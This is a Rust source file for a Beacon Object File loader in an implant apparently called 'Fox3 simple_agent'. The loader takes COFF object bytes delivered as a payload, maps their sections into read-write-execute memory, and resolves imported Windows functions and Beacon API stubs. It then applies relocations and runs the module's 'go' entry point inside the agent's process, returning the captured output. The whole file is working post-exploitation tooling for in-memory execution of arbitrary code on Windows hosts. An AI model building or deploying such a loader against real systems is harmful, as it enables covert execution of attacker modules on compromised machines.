/// Beacon Object File (BOF) / COFF loader for Fox3 simple_agent.
///
/// # Input format
///
/// The `bytes` payload field supports two calling conventions:
///
/// 1. **Separate fields (preferred):** `bytes` = raw AMD64 COFF binary;
///    `bof_args` = packed Beacon argument buffer (may be empty).
///
/// 2. **Legacy inline framing:** `bof_args` is empty and `bytes` contains
///    `[4-byte LE COFF_LEN][COFF bytes][optional packed Beacon args]`.
///
/// # Beacon argument format
///
/// Each arg: `[1-byte type][data...]` using the standard `bof_pack` encoding.
/// BOF entry point: `void go(char* args, int len)`
///
/// # External symbol resolution
///
/// - `DLLNAME$FuncName` → `LoadLibraryA(DLLNAME)` + `GetProcAddress(FuncName)`
/// - Beacon API stubs: `BeaconOutput`, `BeaconPrintf`, `BeaconIsAdmin`,
///   `BeaconDataParse`, `BeaconDataInt`, `BeaconDataShort`,
///   `BeaconDataLength`, `BeaconDataExtract`
///
/// # Output collection
///
/// BOF output written via `BeaconOutput` / `BeaconPrintf` is captured in a
/// thread-local buffer and returned as a `String` after `go()` returns.

/// Public entry point (Windows only).
/// `data`     = raw COFF bytes (or legacy framed blob when `bof_args` is empty)
/// `bof_args` = pre-packed Beacon argument buffer (empty slice → legacy framing)
pub fn execute(data: &[u8], bof_args: &[u8]) -> anyhow::Result<String> {
    #[cfg(windows)]
    { imp::exec_bof(data, bof_args) }
    #[cfg(not(windows))]
    { let _ = (data, bof_args); anyhow::bail!("bof: Windows only") }
}

#[cfg(windows)]
mod imp {
    use std::ffi::{c_void, CString};
    use std::ptr;
    use std::cell::RefCell;
    use std::collections::HashMap;

    const MEM_COMMIT:  u32 = 0x00001000;
    const MEM_RESERVE: u32 = 0x00002000;
    const MEM_RELEASE: u32 = 0x00008000;
    const PAGE_RWX:    u32 = 0x40;

    extern "system" {
        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn LoadLibraryA(name: *const u8) -> *mut c_void;
        fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    }

    // ── Thread-local output buffer (collects BeaconOutput / BeaconPrintf) ─────

    thread_local! {
        static BOF_OUTPUT: RefCell<Vec<u8>> = RefCell::new(Vec::new());
    }

    fn bof_output_take() -> Vec<u8> {
        BOF_OUTPUT.with(|o| std::mem::take(&mut *o.borrow_mut()))
    }

    fn bof_output_push(data: &[u8]) {
        BOF_OUTPUT.with(|o| o.borrow_mut().extend_from_slice(data));
    }

    // ── Beacon API stubs ──────────────────────────────────────────────────────

    unsafe extern "system" fn stub_beacon_output(_type: i32, data: *const u8, len: i32) {
        if data.is_null() || len <= 0 { return; }
        bof_output_push(std::slice::from_raw_parts(data, len as usize));
    }

    // Variadic in the real API; we capture only the format-string argument.
    unsafe extern "system" fn stub_beacon_printf(_type: i32, fmt: *const u8) {
        if fmt.is_null() { return; }
        let mut end = 0usize;
        while *fmt.add(end) != 0 { end += 1; }
        bof_output_push(std::slice::from_raw_parts(fmt, end));
        bof_output_push(b"\n");
    }

    unsafe extern "system" fn stub_beacon_is_admin() -> i32 { 0 }

    // ── datap (Beacon data-parser struct) ─────────────────────────────────────

    #[repr(C)]
    struct DataP { original: *mut u8, buffer: *mut u8, length: i32, size: i32 }

    unsafe extern "system" fn stub_data_parse(p: *mut DataP, buf: *mut u8, size: i32) {
        if p.is_null() { return; }
        (*p).original = buf; (*p).buffer = buf; (*p).size = size; (*p).length = size;
    }

    unsafe extern "system" fn stub_data_int(p: *mut DataP) -> i32 {
        if p.is_null() || (*p).length < 4 { return 0; }
        let mut v = [0u8; 4];
        ptr::copy_nonoverlapping((*p).buffer, v.as_mut_ptr(), 4);
        (*p).buffer = (*p).buffer.add(4); (*p).length -= 4;
        i32::from_be_bytes(v)
    }

    unsafe extern "system" fn stub_data_short(p: *mut DataP) -> i16 {
        if p.is_null() || (*p).length < 2 { return 0; }
        let mut v = [0u8; 2];
        ptr::copy_nonoverlapping((*p).buffer, v.as_mut_ptr(), 2);
        (*p).buffer = (*p).buffer.add(2); (*p).length -= 2;
        i16::from_be_bytes(v)
    }

    unsafe extern "system" fn stub_data_length(p: *mut DataP) -> i32 {
        if p.is_null() { 0 } else { (*p).length }
    }

    unsafe extern "system" fn stub_data_extract(p: *mut DataP, out_len: *mut i32) -> *mut u8 {
        if p.is_null() || (*p).length < 4 { return ptr::null_mut(); }
        let len = stub_data_int(p) as usize;
        if (*p).length < len as i32 { return ptr::null_mut(); }
        let out = (*p).buffer;
        (*p).buffer = (*p).buffer.add(len); (*p).length -= len as i32;
        if !out_len.is_null() { *out_len = len as i32; }
        out
    }

    fn beacon_symbol_table() -> HashMap<&'static str, *mut c_void> {
        let mut m: HashMap<&'static str, *mut c_void> = HashMap::new();
        m.insert("BeaconOutput",      stub_beacon_output   as _);
        m.insert("BeaconPrintf",      stub_beacon_printf   as _);
        m.insert("BeaconIsAdmin",     stub_beacon_is_admin as _);
        m.insert("BeaconDataParse",   stub_data_parse      as _);
        m.insert("BeaconDataInt",     stub_data_int        as _);
        m.insert("BeaconDataShort",   stub_data_short      as _);
        m.insert("BeaconDataLength",  stub_data_length     as _);
        m.insert("BeaconDataExtract", stub_data_extract    as _);
        m
    }

    // ── Public entry point ────────────────────────────────────────────────────

    pub fn exec_bof(data: &[u8], bof_args: &[u8]) -> anyhow::Result<String> {
        if !bof_args.is_empty() {
            // Preferred: data = raw COFF, bof_args = argument buffer
            return bof_load_and_run(data, bof_args);
        }
        // Legacy: [4-byte LE COFF_LEN][COFF][inline args]
        if data.len() < 4 { anyhow::bail!("bof: payload too short"); }
        let coff_len = u32::from_le_bytes(data[0..4].try_into()?) as usize;
        if data.len() < 4 + coff_len { anyhow::bail!("bof: truncated COFF data"); }
        let coff        = &data[4..4 + coff_len];
        let inline_args = &data[4 + coff_len..];
        bof_load_and_run(coff, inline_args)
    }

    fn bof_load_and_run(coff: &[u8], bargs: &[u8]) -> anyhow::Result<String> {
        if coff.len() < 20 { anyhow::bail!("bof: COFF too small"); }

        // ── COFF file header ──────────────────────────────────────────────────
        let machine = u16::from_le_bytes(coff[0..2].try_into()?);
        if machine != 0x8664 {
            anyhow::bail!("bof: not AMD64 COFF (machine=0x{:x})", machine);
        }
        let n_sections    = u16::from_le_bytes(coff[2..4].try_into()?) as usize;
        let sym_table_off = u32::from_le_bytes(coff[8..12].try_into()?) as usize;
        let n_symbols     = u32::from_le_bytes(coff[12..16].try_into()?) as usize;
        let str_table_off = sym_table_off + n_symbols * 18;

        // ── Allocate and populate sections ────────────────────────────────────

        struct Section { reloc_off: usize, n_relocs: usize, alloc_base: *mut u8 }

        let mut sections: Vec<Section> = Vec::with_capacity(n_sections);
        for i in 0..n_sections {
            let base = 20 + i * 40;
            if coff.len() < base + 40 { anyhow::bail!("bof: section header truncated"); }
            let raw_size  = u32::from_le_bytes(coff[base+16..base+20].try_into()?) as usize;
            let raw_off   = u32::from_le_bytes(coff[base+20..base+24].try_into()?) as usize;
            let reloc_off = u32::from_le_bytes(coff[base+24..base+28].try_into()?) as usize;
            let n_relocs  = u16::from_le_bytes(coff[base+32..base+34].try_into()?) as usize;

            let mem = unsafe {
                VirtualAlloc(ptr::null_mut(), raw_size.max(1), MEM_COMMIT | MEM_RESERVE, PAGE_RWX)
            };
            if mem.is_null() { anyhow::bail!("bof: VirtualAlloc for section {} failed", i); }
            if raw_size > 0 && raw_off + raw_size <= coff.len() {
                unsafe { ptr::copy_nonoverlapping(coff[raw_off..].as_ptr(), mem as *mut u8, raw_size); }
            }
            sections.push(Section { reloc_off, n_relocs, alloc_base: mem as *mut u8 });
        }

        let beacon_stubs = beacon_symbol_table();

        let resolve_symbol = |sym_idx: usize| -> anyhow::Result<usize> {
            let sym_off = sym_table_off + sym_idx * 18;
            if coff.len() < sym_off + 18 { anyhow::bail!("bof: symbol {} out of range", sym_idx); }

            let section_num = i16::from_le_bytes(coff[sym_off+12..sym_off+14].try_into()?) as i32;
            let value       = u32::from_le_bytes(coff[sym_off+8..sym_off+12].try_into()?) as usize;

            if section_num > 0 {
                let s_idx = (section_num - 1) as usize;
                if s_idx >= sections.len() { anyhow::bail!("bof: section index {} out of range", s_idx); }
                return Ok(sections[s_idx].alloc_base as usize + value);
            }

            let name_raw = &coff[sym_off..sym_off+8];
            let sym_name: String = if name_raw[0..4] == [0,0,0,0] {
                let str_off = u32::from_le_bytes(name_raw[4..8].try_into()?) as usize;
                let abs = str_table_off + str_off;
                if abs >= coff.len() { anyhow::bail!("bof: string table offset out of range"); }
                let end = coff[abs..].iter().position(|&b| b == 0).unwrap_or(0);
                String::from_utf8_lossy(&coff[abs..abs+end]).to_string()
            } else {
                let end = name_raw.iter().position(|&b| b == 0).unwrap_or(8);
                String::from_utf8_lossy(&name_raw[..end]).to_string()
            };

            if let Some(&fp) = beacon_stubs.get(sym_name.as_str()) {
                return Ok(fp as usize);
            }

            if let Some(sep) = sym_name.find('$') {
                let dll_name  = &sym_name[..sep];
                let func_name = &sym_name[sep+1..];
                let dll_cstr  = CString::new(dll_name).unwrap();
                let fn_cstr   = CString::new(func_name).unwrap();
                unsafe {
                    let hmod = LoadLibraryA(dll_cstr.as_ptr() as *const u8);
                    if hmod.is_null() { anyhow::bail!("bof: LoadLibrary({}) failed", dll_name); }
                    let fp = GetProcAddress(hmod, fn_cstr.as_ptr() as *const u8);
                    if fp.is_null() { anyhow::bail!("bof: GetProcAddress({}) failed", func_name); }
                    return Ok(fp as usize);
                }
            }

            anyhow::bail!("bof: unresolved symbol '{}'", sym_name)
        };

        // ── Apply AMD64 relocations ───────────────────────────────────────────

        for sec in &sections {
            for r in 0..sec.n_relocs {
                let rel_off  = sec.reloc_off + r * 10;
                if coff.len() < rel_off + 10 { break; }
                let vaddr    = u32::from_le_bytes(coff[rel_off..rel_off+4].try_into()?) as usize;
                let sym_idx  = u32::from_le_bytes(coff[rel_off+4..rel_off+8].try_into()?) as usize;
                let rel_type = u16::from_le_bytes(coff[rel_off+8..rel_off+10].try_into()?);
                let sym_addr = resolve_symbol(sym_idx)?;
                let patch    = unsafe { sec.alloc_base.add(vaddr) };

                unsafe {
                    match rel_type {
                        0x0001 => {
                            // ADDR64: 64-bit absolute
                            ptr::write_unaligned(patch as *mut u64, sym_addr as u64);
                        }
                        0x0004..=0x0009 => {
                            // REL32 + addend(0-4): 32-bit PC-relative
                            let addend = (rel_type - 0x0004) as i64;
                            let delta = (sym_addr as i64) - (patch as i64 + 4) - addend;
                            if delta > i32::MAX as i64 || delta < i32::MIN as i64 {
                                anyhow::bail!("bof: REL32 overflow at sym 0x{:x}", sym_addr);
                            }
                            ptr::write_unaligned(patch as *mut i32, delta as i32);
                        }
                        other => anyhow::bail!("bof: unsupported relocation 0x{:04x}", other),
                    }
                }
            }
        }

        // ── Locate `go` entry point ───────────────────────────────────────────

        let mut go_addr: Option<usize> = None;
        'outer: for i in 0..n_symbols {
            let sym_off = sym_table_off + i * 18;
            if coff.len() < sym_off + 18 { break; }
            let name_raw = &coff[sym_off..sym_off+8];
            let sym_name: &[u8] = if name_raw[0..4] == [0,0,0,0] {
                let str_off = u32::from_le_bytes(name_raw[4..8].try_into().unwrap_or([0;4])) as usize;
                let abs = str_table_off + str_off;
                if abs >= coff.len() { continue; }
                let end = coff[abs..].iter().position(|&b| b == 0).unwrap_or(0);
                &coff[abs..abs+end]
            } else {
                let end = name_raw.iter().position(|&b| b == 0).unwrap_or(8);
                &name_raw[..end]
            };

            if sym_name == b"go" {
                let sec_num = i16::from_le_bytes(coff[sym_off+12..sym_off+14].try_into().unwrap_or([0;2])) as i32;
                let value   = u32::from_le_bytes(coff[sym_off+8..sym_off+12].try_into().unwrap_or([0;4])) as usize;
                if sec_num > 0 {
                    let s_idx = (sec_num - 1) as usize;
                    if s_idx < sections.len() {
                        go_addr = Some(sections[s_idx].alloc_base as usize + value);
                    }
                }
                break 'outer;
            }
        }

        let go = go_addr.ok_or_else(|| anyhow::anyhow!("bof: `go` symbol not found"))?;

        // ── Execute go(args, len) ─────────────────────────────────────────────

        bof_output_take(); // clear leftover from any prior BOF
        let args_ptr = if bargs.is_empty() { ptr::null_mut() } else { bargs.as_ptr() as *mut u8 };
        let args_len = bargs.len() as i32;

        unsafe {
            let go_fn: unsafe extern "system" fn(*mut u8, i32) =
                std::mem::transmute(go as *mut c_void);
            go_fn(args_ptr, args_len);
        }

        let out = bof_output_take();

        // Free section allocations
        for sec in &sections {
            unsafe { VirtualFree(sec.alloc_base as *mut c_void, 0, MEM_RELEASE); }
        }

        Ok(String::from_utf8_lossy(&out).into_owned())
    }
}
